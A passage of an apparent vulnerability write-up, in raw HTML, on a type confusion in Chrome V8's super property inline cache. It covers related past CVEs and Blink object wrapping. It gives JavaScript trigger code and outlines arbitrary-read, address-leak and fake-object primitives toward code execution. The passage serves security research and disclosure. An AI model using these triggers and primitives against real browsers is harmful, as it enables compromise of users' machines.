+<p>The super inline cache (SuperIC) is the inline cache used for <a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/super">super property</a> accesses. The relevant bytecode is <code>GetNamedPropertyFromSuper</code> that is handled as <a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/c4430196c7c0ca1445dc48151912e659c80fc913:v8/src/interpreter/interpreter-generator.cc;l=558">follows</a>:</p>
+<pre><code>IGNITION_HANDLER(GetNamedPropertyFromSuper, InterpreterAssembler) &#123;
+  ...
+  TNode&lt;Object&gt; result =
+      CallBuiltin(Builtin::kLoadSuperIC, context, receiver,
+                  home_object_prototype, name, slot, feedback_vector);
+  SetAccumulator(result);
+  Dispatch();
+&#125;
+</code></pre>
+<p>Perhaps predictably, it is handled by the <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/c4430196c7c0ca1445dc48151912e659c80fc913:v8/src/ic/accessor-assembler.cc;l=3127;drc=242da5037807dde3daf097ba74f875db83b8b613">LoadSuperIC</a></code> function. The function follows a very similar flow to the <code>LoadIC</code> function described in the section <a href="#cachingandusingpropertyaccesshandler">“Caching and using property access handler”.</a> One level of complication introduced by super property is that the property is now defined not on the receiver (<code>this</code>) object, but rather, on the parent prototype. As such, the assumptions about object types and maps should be examined not only in the receiver object, but also the parent prototype, because as we have seen, these objects can have different types. In the inline cache code, this is specified by adding a <code>lookup_start_object</code> parameter:</p>
+<pre><code>void AccessorAssembler::LoadSuperIC(const LoadICParameters* p) &#123;
+  ...
+  TNode&lt;Map&gt; lookup_start_object_map =
+      LoadReceiverMap(p-&gt;lookup_start_object());
+  ...
+</code></pre>
+<p>In the V8 code, the object where the property access is called (where <code>this</code> refers to) is referred to as the <code>receiver</code> or <code>home_object</code>. The confusion between this <code>lookup_start_object</code> and <code>receiver</code> has led to multiple vulnerabilities in the past. The first bug of this type was <a target="_blank" rel="external nofollow noopener noreferrer" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1203122">CVE-2021-30517</a> reported by laural. As this bug introduces some concepts and techniques that are useful to understand the other bugs, I’ll explain it in a bit more detail here.</p>
+<p>The vulnerability happened when a specific type of handler, the <code>call_handler</code> is found during a cache lookup:</p>
+<pre><code>void AccessorAssembler::HandleLoadICHandlerCase(
+    const LazyLoadICParameters* p, TNode&lt;Object&gt; handler, Label* miss,
+    ExitPoint* exit_point, ICMode ic_mode, OnNonExistent on_nonexistent,
+    ElementSupport support_elements, LoadAccessMode access_mode) &#123;
+  ...
+
+<p>  BIND(&amp;call_handler);<br>  &amp;#123;<br>    exit_point-&gt;ReturnCallStub(LoadWithVectorDescriptor&amp;#123;&amp;#125;, CAST(handler),<br>                               p-&gt;context(), p-&gt;receiver(), p-&gt;name(),     &#x2F;&#x2F;&lt;——- receiver used in the call.<br>                               p-&gt;slot(), p-&gt;vector());<br>  &amp;#125;<br>&amp;#125;<br></p></code></pre><p></p>
+<p>In the case of SuperIC, the <code>lookup_start_object</code> should have been used as an argument to the call, but instead, the <code>receiver</code> was used, causing a function to be called on an object of the wrong type. The <code>call_handler</code> is a special handler that is only applicable to objects of type <code>String</code> and <code>Function</code>:</p>
+<pre><code>Handle&lt;Object&gt; LoadIC::ComputeHandler(LookupIterator* lookup) &#123;
+  Handle&lt;Object&gt; receiver = lookup-&gt;GetReceiver();
+  ...
+  if (!IsAnyHas() &amp;&amp; !lookup-&gt;IsElement()) &#123;
+    if (receiver-&gt;IsString() &amp;&amp; *lookup-&gt;name() == roots.length_string()) &#123;
+      TRACE_HANDLER_STATS(isolate(), LoadIC_StringLength);
+      return BUILTIN_CODE(isolate(), LoadIC_StringLength);
+    &#125;
+    ...
+    // Use specialized code for getting prototype of functions.
+    if (receiver-&gt;IsJSFunction() &amp;&amp;
+        *lookup-&gt;name() == roots.prototype_string() &amp;&amp;
+        !JSFunction::cast(*receiver).PrototypeRequiresRuntimeLookup()) &#123;
+      TRACE_HANDLER_STATS(isolate(), LoadIC_FunctionPrototypeStub);
+      return BUILTIN_CODE(isolate(), LoadIC_FunctionPrototype);
+    &#125;
+  &#125;
+</code></pre>
+<p>When the <code>length</code> property of a <code>String</code> or the <code>prototype</code> property of a <code>JSFunction</code> is accessed, the inline cache will create a <code>call_handler</code> using <code>BUILTIN_CODE</code> in the above to encode the C++ function that needs to be called to access these properties. As this is a low-level function, it assumes the object is of the correct type with the correct memory layout, and it is therefore important to check the type of the object before calling the function. In the case of SuperIC, this is done by using the <code>map</code> of the <code>lookup_start_object</code> to determine a cache match. This ensures that <code>lookup_start_object</code> has the correct type to be used by the <code>call_handler</code>. However, in the problematic code, <code>receiver</code> is used instead for the call, which could have any object type. This causes the type confusion:</p>
+<pre><code> class C &#123;
+        m() &#123;
+            super.prototype
+        &#125;
+ &#125;
+ function f() &#123;&#125;
+ C.prototype.__proto__ = f  //&lt;------ lookup_start_object =&gt; f: mathces handler for function type
+ let c = new C();
+ c.m(); //&lt;----------- receiver =&gt; c, calling Function::prototype on c, which is a JS_OBJECT
+</code></pre>
+<p>While this is the root cause of the problem, a closer look at <code>ComputeHandler</code> shows a potential problem in triggering the bug:</p>
+<pre><code>Handle&lt;Object&gt; LoadIC::ComputeHandler(LookupIterator* lookup) &#123;
+  Handle&lt;Object&gt; receiver = lookup-&gt;GetReceiver();
+  ...
+  if (!IsAnyHas() &amp;&amp; !lookup-&gt;IsElement()) &#123;
+    ...
+    if (receiver-&gt;IsString() &amp;&amp; *lookup-&gt;name() == roots.length_string()) &#123;
+      TRACE_HANDLER_STATS(isolate(), LoadIC_StringLength);
+      return BUILTIN_CODE(isolate(), LoadIC_StringLength);
+    &#125;
+    ...
+  &#125;
+</code></pre>
+<p>Although the <code>call_handler</code> is called using the <code>receiver</code>, it is also the type of the <code>receiver</code> that was checked when the <code>call_handler</code> is created for the <code>super.prototype</code> operation. As the function that calls <code>super.prototype</code> would have to be defined in the definition of a class, it seems that the type of <code>receiver</code> cannot (object referred to by <code>this</code> in the function) change either. So it looks like the <code>receiver</code> would have to be of the correct type despite the mistake. To trigger the bug, we need to go beyond the simple case of the monomorphic inline cache.</p>
+<h3 id="megamorphic-inline-cache"><strong><span id="megamorphicinlinecache">Megamorphic inline cache</span></strong><a aria-label="&lt;strong&gt;&lt;span id="megamorphicinlinecache"&gt;Megamorphic inline cache&lt;/span&gt;&lt;/strong&gt;" class="heading-link pl-2 text-italic text-bold" href="#megamorphic-inline-cache"></a></h3>
+<p>Although in the simplest case, each function has its own inline cache for each property access, it is possible for different functions to share an inline cache. The inline cache can go through a transition and become megamorphic if it receives too many different object maps:</p>
+<pre><code>function f(a) &#123;
+  return a.x;
+&#125;
+</code></pre>
+<p>In the above, if the argument <code>a</code> always has the same <code>map</code>, then the inline cache will be monomorphic and can only handle receivers with the specific <code>map</code>. When objects of different maps are passed to <code>a</code>, the inline cache transitions into a polymorphic inline cache and is capable of handling multiple maps. However, there is a limit on the number of maps that a polymorphic cache can handle. If the number of different maps continues to increase, then the inline cache transitions into a megamorphic inline cache. In this case, the inline cache is shared by different functions and handlers created in one function can be used by another (if both are using the megamorphic cache). For example, in the following:</p>
+<pre><code>function main() &#123;
+  function f() &#123;&#125;
+  class A &#123;
+    m() &#123;
+      return super.prototype;
+    &#125;
+  &#125;;
+  A.prototype.__proto__ = f;
+  f.prototype;
+  let a = new A();
+  a.m();
+&#125;
+</code></pre>
+<p>Everytime <code>main</code> is run, a new <code>map</code> is created for the class <code>A</code> (because it treats the class definition as new), and everytime <code>f</code> is assigned to <code>A.prototype.__proto__</code>, a new <code>map</code> is also assigned to <code>f</code> (because it becomes a prototype). For each call to <code>main</code>, the code <code>f.prototype</code> in <code>main</code> and <code>super.prototype</code> in <code>m</code> are both accessing properties of objects with a different <code>map</code>, so eventually, both of these accesses will use the megamorphic inline cache. When this happens, <code>super.prototype</code> will end up using the handler created by <code>f.prototype</code>:</p>
+<pre><code>function main() &#123;
+  ...
+  A.prototype.__proto__ = f;
+  f.prototype;    //&lt;------ create handler for map of f in megamorphic cache
+  let a = new A();
+  a.m();          //&lt;------ calls super.prototype, lookup_start_object is f,
+                  //        so the handler created by f.prototype will be used
+                  //        but `a` (receiver) will be used by the handler
+&#125;
+</code></pre>
+<p>By using the megamorphic inline cache, the mistake made in passing the receiver, instead of <code>lookup_start_object</code> to the <code>call_handler</code> can be exploited to cause type confusion.</p>
+<p>In October 2021, another bug, <a target="_blank" rel="external nofollow noopener noreferrer" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1260577">CVE-2021-38001</a> that confused <code>receiver</code> and <code>lookup_start_object</code> was used in the Tianfu Cup competition by Qixun Zhao to cause remote code execution in Chrome. I’ll refer readers to the bug ticket for more details.</p>
+<h3 id="the-vulnerability"><strong><span id="thevulnerability">The vulnerability</span></strong><a aria-label="&lt;strong&gt;&lt;span id="thevulnerability"&gt;The vulnerability&lt;/span&gt;&lt;/strong&gt;" class="heading-link pl-2 text-italic text-bold" href="#the-vulnerability"></a></h3>
+<p>This brings us to the current vulnerability, which is the third bug of this kind in SuperIC. This bug occurs in the property accessor case. When a handler is created for a property accessor:</p>
+<pre><code>Handle&lt;Object&gt; LoadIC::ComputeHandler(LookupIterator* lookup) &#123;
+    ...
+    case LookupIterator::ACCESSOR: &#123;
+        ...
+        CallOptimization call_optimization(isolate(), getter);
+        if (call_optimization.is_simple_api_call()) &#123;          //&lt;--------- 1.
+          CallOptimization::HolderLookup holder_lookup;
+          Handle&lt;JSObject&gt; api_holder =
+              call_optimization.LookupHolderOfExpectedType(isolate(), map,      //&lt;----- 2.
+                                                           &amp;holder_lookup);
+
+<pre><code>      if (!call_optimization.IsCompatibleReceiverMap(api_holder, holder,    //&amp;lt;----- 3.
+                                                     holder_lookup) ||
+          !holder-&amp;gt;HasFastProperties()) &amp;#123;
+        TRACE_HANDLER_STATS(isolate(), LoadIC_SlowStub);
+        return LoadHandler::LoadSlow(isolate());
+      &amp;#125;
+
+      smi_handler = LoadHandler::LoadApiGetter(
+          isolate(), holder_lookup == CallOptimization::kHolderIsReceiver);
+      ...
+</code></pre>
+<p></p></code></pre><p></p>
+<p>If the <code>getter</code> of the property is a <code>simple_api_call</code> (check, for 1.), two further checks in 2. and 3. will be done to ensure that <code>map</code> is of the appropriate type for <code>getter</code> to use. A <code>simple_api_call</code> is a way to let V8 use C++ functions defined externally when it is used as an <a target="_blank" rel="external nofollow noopener noreferrer" href="https://v8.dev/docs/embed">embedded</a> application.</p>
+<p>In Chrome, V8 is not used as a standalone application but rather used as an <a target="_blank" rel="external nofollow noopener noreferrer" href="https://v8.dev/docs/embed">embedded</a> application in <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.chromium.org/blink/">Blink</a> (the rendering engine) and <a target="_blank" rel="external nofollow noopener noreferrer" href="https://pdfium.googlesource.com/pdfium/+/master/README.md">PDFium</a> (used for viewing PDF files). The interactions between V8 and its embedder (Blink, PDFium, etc.) are handled via the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://v8.dev/docs/embed#advanced-guide">V8</a>API. On the one hand, the V8 API allows the embedder to access V8 objects and functionalities, while on the other hand, it also allows functions defined in the embedder to be called from V8. The latter functionality is provided by API calls and is used extensively in Blink to create JavaScript objects whose implementations are defined in Blink. I’ll explain this in more detail later, but in essence, a <code>simple_api_call</code> can be thought of as a C++ function defined in the embedder that receives V8 objects as inputs. A <code>simple_api_call</code> expects its argument to have a certain memory layout, determined by the V8 object type, and it is important that V8 objects of the correct types are used when calling the function (C++ typing cannot distinguish different V8 object types, and under the hood, a <code>simple_api_call</code> simply casts a V8 object to the desired type). This is what the checks in 2. and 3. are about. The only problem is that they are checking the wrong <code>map</code>. The <code>map</code> being checked is the <code>map</code> of the <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/dd1159653baab787bc341ddbf42af5aeab3c1634:v8/src/ic/ic.cc;drc=0e62a0d65e3d7f5c9d968adeae7c478c9434a940;l=962">lookup_start_object</a></code>:</p>
+<pre><code>Handle&lt;Object&gt; LoadIC::ComputeHandler(LookupIterator* lookup) &#123;
+  ...
+  Handle&lt;Map&gt; map = lookup_start_object_map();
+  ...
+    case LookupIterator::ACCESSOR: &#123;
+</code></pre>
+<p>However, recall that when a <code>super</code> accessor is called, the <code>receiver</code>, instead of the object where the accessor is defined, is used for the call:</p>
+<pre><code>class B &#123;
+  m() &#123;
+    return super.prop;
+  &#125;
+&#125;
+
+<p>var b &#x3D; new B();<br>var a &#x3D; &amp;#123;get prop() &amp;#123;return this.x&amp;#125;, x : ‘A’&amp;#125;;<br>b.x &#x3D; ‘B’;</p>
+<p>B.prototype.<strong>proto</strong> &#x3D; A;</p>
+<p>b.m() &#x2F;&#x2F;&lt;——– ‘B’<br></p></code></pre><p></p>
+<p>The above would give <code>B</code> instead of <code>A</code>. This can be confirmed from how the API<a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/af93b3d584c22547ae5d6c49c56df07f2f7a2ca5:v8/src/ic/accessor-assembler.cc;l=285"> is called</a>:</p>
+<pre><code>void AccessorAssembler::HandleLoadAccessor(
+    const LazyLoadICParameters* p, TNode&lt;CallHandlerInfo&gt; call_handler_info,
+    TNode&lt;WordT&gt; handler_word, TNode&lt;DataHandler&gt; handler,
+    TNode&lt;IntPtrT&gt; handler_kind, ExitPoint* exit_point) &#123;
+  ...
+  BIND(&amp;load);
+  TNode&lt;IntPtrT&gt; argc = IntPtrConstant(0);
+  exit_point-&gt;Return(CallApiCallback(context, callback, argc, data,
+                                     api_holder.value(), p-&gt;receiver()));     //&lt;------- receiver is used to call the api
+&#125;
+</code></pre>
+<p>I hope I explained this well enough, but if you find this confusing, you’re not alone. The situation is actually confusing enough that the initial patch, proposed by the developer, <a target="_blank" rel="external nofollow noopener noreferrer" href="https://chromium.googlesource.com/v8/v8/+/96c5daaea685c72abbc20b8083f6e40c87cabccd">had to be reverted</a>.</p>
+<h2 id="interactions-between-v8-and-blink"><strong><span id="v8blink">Interactions between V8 and Blink</span></strong><a aria-label="&lt;strong&gt;&lt;span id="v8blink"&gt;Interactions between V8 and Blink&lt;/span&gt;&lt;/strong&gt;" class="heading-link pl-2 text-italic text-bold" href="#interactions-between-v8-and-blink"></a></h2>
+<p>In Chrome, Blink is responsible for implementing the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/API">Web API</a>, which contains objects that are needed to render web pages but are not part of standard JavaScript objects (for example, the DOM window). While the functionalities of these objects and interfaces are implemented in Blink, they are often accessible as JavaScript objects. In this section, I’ll describe how Blink objects are represented in V8 and how V8 can use functions implemented in Blink.</p>
+<p>Take the <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/API/DOMRectReadOnly">DOMRectReadOnly</a></code> object for example. This is a simple object with some data fields, <code>x</code>, <code>y</code>, <code>height</code>, <code>width</code>, <code>top</code>, <code>right</code>, <code>bottom,</code> and <code>left</code> specifying the dimensions of a rectangle. It is defined in <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/af93b3d584c22547ae5d6c49c56df07f2f7a2ca5:third_party/blink/renderer/core/geometry/dom_rect_read_only.h">third_party/blink/renderer/core/geometry/dom_rect_read_only.h</a></code>, with simple implementations for accessing these fields:</p>
+<pre><code>class CORE_EXPORT DOMRectReadOnly : public ScriptWrappable &#123;
+  DEFINE_WRAPPERTYPEINFO();
+
+<p> public:<br>  static DOMRectReadOnly* Create(double x,<br>                                 double y,<br>                                 double width,<br>                                 double height);<br>  …</p>
+<p>  double x() const &amp;#123; return x_; &amp;#125;<br>  …<br> protected:<br>  double x_;<br>  …<br>&amp;#125;;<br></p></code></pre><p></p>
+<p>When a <code>DOMRectReadOnly</code> object is created in JavaScript, two objects are created. First the Blink function <code>DOMRectReadOnly::Create</code> is called to create a <code>DOMRectReadOnly</code> object in Blink. This object is then wrapped in V8 as a <code>JS_API_OBJECT</code>, which has the following memory layout:</p>
+<p><img><img alt class="alignnone size-full wp-image-65770 width-fit" data-recalc-dims="1" data-src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" height="279" sizes="(max-width: 494px) 100vw, 494px" src="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Chromium-1.png?resize=494%2C279" width="494"></p>
+<p>The important parts are the pointers at <code>0xc</code> and <code>0x10</code>. The first one is a pointer to the static <code>wrapper_type_info_</code> field defined in <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/af93b3d584c22547ae5d6c49c56df07f2f7a2ca5:third_party/blink/renderer/core/geometry/dom_rect.h:21">DOMRectReadOnly</a></code>, which specifies the type of the Blink object that is wrapped. The second is the pointer at <code>0x10</code>, which points to the <code>DOMRectReadOnly</code> object created in Blink.</p>
+<p>On the other hand, a Blink object that can be accessed from V8 inherits from the base class <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/a9048e03fba5ba168b4b84d5c96f9b11e24505fe:third_party/blink/renderer/platform/bindings/script_wrappable.h;l=53">ScriptWrappable</a></code>. This class contains the field <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/a9048e03fba5ba168b4b84d5c96f9b11e24505fe:third_party/blink/renderer/platform/bindings/script_wrappable.h;l=157">ScriptWrappable::main_world_wrapper_</a></code> which provides a link back to the V8 object that wraps this Blink object.</p>
+<p><img><img alt class="alignnone size-full wp-image-65771 width-fit" data-recalc-dims="1" data-src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" height="457" loading="lazy" sizes="(max-width: 860px) 100vw, 860px" src="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Chromium-2.png?resize=860%2C457" width="860"></p>
+<p>When a property or a method in the Blink object is accessed from JavaScript, generated code implemented in <code>gen/third_party/blink/bindings/*</code> is used to invoke the appropriate function implemented in Blink. For <code>DOMRectReadOnly</code>, the implementation is in <code>gen/third_party/blink/renderer/bindings/core/v8/v8_dom_rect_read_only.cc</code>. (The naming conventions of these files are <code>v8_&lt;blink class name in snake case&gt;</code>). For example, when the property <code>x</code> is read, the <code>XAttributeGetCallback</code> is used as the <code>getter</code> for the property <code>x</code>:</p>
+<pre><code>void XAttributeGetCallback(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123;
+  ...
+  v8::Local&lt;v8::Object&gt; v8_receiver = info.This();
+  DOMRectReadOnly* blink_receiver =
+      V8DOMRectReadOnly::ToWrappableUnsafe(v8_receiver);   //&lt;-------- 1.
+  auto&amp;&amp; return_value = blink_receiver-&gt;x();               //&lt;-------- 2.
+  bindings::V8SetReturnValue(info, return_value,
+                             bindings::V8ReturnValue::PrimitiveType&lt;double&gt;());
+&#125;
+</code></pre>
+<p>In the above, <code>v8_receiver</code> is the V8 object that wraps the Blink <code>DOMRectReadOnly</code> object. When <code>V8DOMRectReadOnly::ToWrappableUnsafe</code> is called, it checks that the V8 object represented by <code>v8_receiver</code> is either a <code>JS_OBJECT</code>, a <code>JS_API_OBJECT</code> or a <code>JS_SPECIAL_API_OBJECT</code> using the <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/170ad143c610338c831676883be565fff8c71bb3:v8/src/api/api.cc;l=3838">CanHaveInternalField</a></code> check and then returns the pointer at <code>0x10</code> as the <code>blink_receiver</code> and casts it into a <code>DOMRectReadOnly</code> pointer (1. in the above). The function <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/af93b3d584c22547ae5d6c49c56df07f2f7a2ca5:third_party/blink/renderer/core/geometry/dom_rect_read_only.h;l=34">DOMRectReadOnly::x</a></code> is then used to retrieve <code>x</code> as a double value (2. in the above).</p>
+<p>Normally, when calling an API function, like the above, a <a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/334c8a70297520a868e1a4aa4f48bb157e1ce6d3:v8/src/builtins/builtins-api.cc;l=94">check</a> is performed in <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/334c8a70297520a868e1a4aa4f48bb157e1ce6d3:v8/src/builtins/builtins-api.cc;l=51">HandleApiCallHelper</a></code> to ensure that the function is called with a <code>v8_receiver</code> wrapping a Blink object of the correct type. However, the type confusion in <a href="#thevulnerability">“the vulnerability</a> allows me to bypass this and call a Blink <code>getter</code> on an arbitrary type of Blink object. This is a very strong primitive.</p>
+<p>Note that, because of the type check that is in place in <code>HandleApiCallHelper</code>, a super property access using API calls will throw a <code>TypeError</code> if the <code>receiver</code> is not of the type expected by the <code>getter</code>:</p>
+<pre><code> class B &#123;
+    m() &#123;
+      return super.x;
+    &#125;
+  &#125;
+  B.prototype.__proto__ = new DOMRectReadOnly(1, 1, 1, 1);
+  let b = new B();
+  b.m(); //&lt;---- throws TypeError: Illegal invocation
+</code></pre>
+<p>To avoid the type error being thrown while creating the inline cache, the megamorphic cache (see section <a href="#megamorphicinlinecache">Megamorphic inline cache</a>) is used to construct the inline cache in a different function:</p>
+<pre><code>class B &#123;
+  m() &#123;
+    return super.x;
+  &#125;
+&#125;
+
+<p>function main() &amp;#123;<br>  var domRect &#x3D; new DOMRect(1, 1, 1, 1);<br>  domRect[‘a’ + i] &#x3D; 1;<br>  if (i &lt; 20 - 1) &amp;#123;<br>    B.prototype.<strong>proto</strong> &#x3D; &amp;#123;&amp;#125;;  &#x2F;&#x2F;&lt;—– sets to <code>&amp;#123;&amp;#125;</code> to avoid throw before triggering bug.<br>  &amp;#125; else &amp;#123;<br>    B.prototype.<strong>proto</strong> &#x3D; domRect;  &#x2F;&#x2F;&lt;—– triggers the bug after inline cache is created.<br>  &amp;#125;<br>  let b &#x3D; new B();</p>
+<p>  b.x0 &#x3D; 0x40404040;<br>  b.x1 &#x3D; 0x41414141;<br>  b.x2 &#x3D; 0x42424242;<br>  b.x3 &#x3D; 0x43434343;<br>  domRect.x; &#x2F;&#x2F;&lt;—— create inline cache<br>  b.m();     &#x2F;&#x2F;&lt;—— use inline cache, type confusion on i &#x3D;&#x3D; 20<br>&amp;#125;  </p>
+<p>for (let i &#x3D; 0; i &lt; 20; i++) main(i);<br></p></code></pre><p></p>
+<p>This is the basic template for triggering the bug (although I later discovered that putting a <code>try</code> block around <code>super.x</code> also works without the need to use a megamorphic inline cache).</p>
+<h2 id="exploiting-the-bug">Exploiting the bug<a aria-label="Exploiting the bug" class="heading-link pl-2 text-italic text-bold" href="#exploiting-the-bug"></a></h2>
+<p>Now that the primitives are clear, exploiting the bug is mostly down to finding Blink objects with the appropriate memory layout to exploit the type confusion. In what follows, I’ll break down the exploit into three parts:</p>
+<ol>
+<li>Construct an arbitrary read primitive that allows me to read from any address.</li>
+<li>Leak the address of a particular V8 object. As the V8 heap is a simple linear heap, having the address of a particular V8 object allows me to also calculate the addresses of objects allocated after it. The read primitive constructed in step one can then be used to read the data in these objects. In particular, I can use it to leak addresses of object maps and addresses of <code>Array</code> backing stores.</li>
+<li>Construct the <code>fakeObj</code> primitive to fake an arbitrary V8 object. This can then be used to construct a fake <code>Array</code> with <code>length</code> larger than the size of its backing store to achieve out-of-bounds (OOB) read and write.</li>
+</ol>
+<p>Once I’ve achieved these primitives, achieving remote code execution is fairly standard.</p>
+<h3 id="gaining-arbitrary-read-primitive">Gaining arbitrary read primitive<a aria-label="Gaining arbitrary read primitive" class="heading-link pl-2 text-italic text-bold" href="#gaining-arbitrary-read-primitive"></a></h3>
+<p>To achieve arbitrary read, I’ll use <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/334c8a70297520a868e1a4aa4f48bb157e1ce6d3:third_party/blink/renderer/modules/device_orientation/device_motion_event.h">DeviceMotionEvent</a></code>. Its member <code>interval</code> is accessed using the <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/334c8a70297520a868e1a4aa4f48bb157e1ce6d3:third_party/blink/renderer/modules/device_orientation/device_motion_event.cc;l=63">interval</a></code> function:</p>
+<pre><code>class DeviceMotionEvent final : public Event &#123;
+  DEFINE_WRAPPERTYPEINFO();
+
+<p> public:<br>  double DeviceMotionEvent::interval() const &amp;#123;<br>    &#x2F;&#x2F;reads the field <code>interval_</code> from <code>device_motion_data_</code><br>    return device_motion_data_-&gt;Interval();<br>  &amp;#125;</p>
+<p>  …<br> private:<br>  Member&lt;const DeviceMotionData&gt; device_motion_data_;<br>&amp;#125;</p>
+<p>class MODULES_EXPORT DeviceMotionData final<br>    : public GarbageCollected&lt;DeviceMotionData&gt; &amp;#123;<br> public:<br>  …<br>  double Interval() const &amp;#123; return interval_; &amp;#125;<br>  …<br> private:<br>  …<br>  double interval_;<br>&amp;#125;;<br></p></code></pre><p></p>
+<p>This reads the value of <code>interval_</code> from an offset of the address of the <code>DeviceMotionEvent::device_motion_data_</code> field. So by using the type confusion to apply <code>interval</code> to another Blink object, whose field at the offset of <code>device_motion_data_</code> can be controlled, I can read data from an arbitrary address. There are various objects in Blink that are essentially data objects, such as the <code>DOMRect</code> that we encountered before, as well as the <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/API/DOMMatrix">DOMMatrix</a></code>, which consists of sixteen contiguous <code>double</code> fields (<code>m11, ..., m44</code>). These are ideal objects to use here:</p>
+<p><img><img alt class="alignnone size-full wp-image-65772 width-fit" data-recalc-dims="1" data-src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" height="540" loading="lazy" sizes="(max-width: 960px) 100vw, 960px" src="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Chromium-3.png?resize=960%2C540" width="960"></p>
+<p>By using the type confusion to call <code>DeviceMotionEvent::interval</code> on <code>DOMMatrix</code>, it is then possible to read 8 bytes at an arbitrary address and returns the result as a <code>double</code>.</p>
+<h3 id="getting-object-address"><strong><span id="objectaddress">Getting object address</span></strong><a aria-label="&lt;strong&gt;&lt;span id="objectaddress"&gt;Getting object address&lt;/span&gt;&lt;/strong&gt;" class="heading-link pl-2 text-italic text-bold" href="#getting-object-address"></a></h3>
+<p>To get the address of a V8 object, I’ll use the <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/a9048e03fba5ba168b4b84d5c96f9b11e24505fe:third_party/blink/renderer/core/html/canvas/image_data.h;l=51">ImageData</a></code> object. This object can be created with a <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint8ClampedArray">Uint8ClampedArray</a></code> as its backing store.</p>
+<pre><code>var imgData = new Uint8ClampedArray(48);
+var img = new ImageData(imgData, 8, 6);
+</code></pre>
+<p>The <code>imgData</code> <code>Uint8ClampedArray</code> that is passed to the constructor is stored as a pointer to a <code>DOMUint8ClampedArray</code> in the field <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/a9048e03fba5ba168b4b84d5c96f9b11e24505fe:third_party/blink/renderer/core/html/canvas/image_data.h;l=224">ImageData::data_u8_</a></code>. A <code>DOMUint8ClampedArray</code> is the Blink representation of a <code>Uint8ClampedArray</code> in V8. In particular, as explained in the section <a href="#v8blink">Interactions between V8 and Blink</a>, it is a <code>ScriptWrappable</code> object that contains a <code>main_world_wrapper_</code> field that can be used to retrieve the address of the <code>Uint8ClampedArray</code> (<code>imgData</code>) in V8.</p>
+<p>The value of the <code>data_u8_</code> field (that points to a <code>DOMUint8ClampedArray</code>) can be read using a type confusion between a <code>DOMMatrix</code> with <code>ImageData</code> and then reading the appropriate field in <code>DOMMatrix</code> back as a <code>double</code>:</p>
+<p><img><img alt class="alignnone size-full wp-image-65773 width-fit" data-recalc-dims="1" data-src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" height="388" loading="lazy" sizes="(max-width: 554px) 100vw, 554px" src="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Chromium-4.png?resize=554%2C388" width="554"></p>
+<p>Once the value of <code>data_u8_</code> is obtained, the arbitrary read primitive I constructed before can be used multiple times to first read <code>data_u8_-&gt;main_world_wrapper_</code>, which is a location that contains the address of the <code>imgData</code> V8 object. The arbitrary read primitive can then be applied again to read the address of <code>imgData</code> in V8 from this location. This then gives the full address of the <code>imgData</code> V8 <code>Uint8ClampedArray</code> object. As V8 allocates objects in a linear fashion, addresses of objects that are allocated after <code>imgData</code> can also be computed from the address of <code>imgData</code>.</p>
+<h3 id="creating-arbitrary-fake-object">Creating arbitrary fake object<a aria-label="Creating arbitrary fake object" class="heading-link pl-2 text-italic text-bold" href="#creating-arbitrary-fake-object"></a></h3>
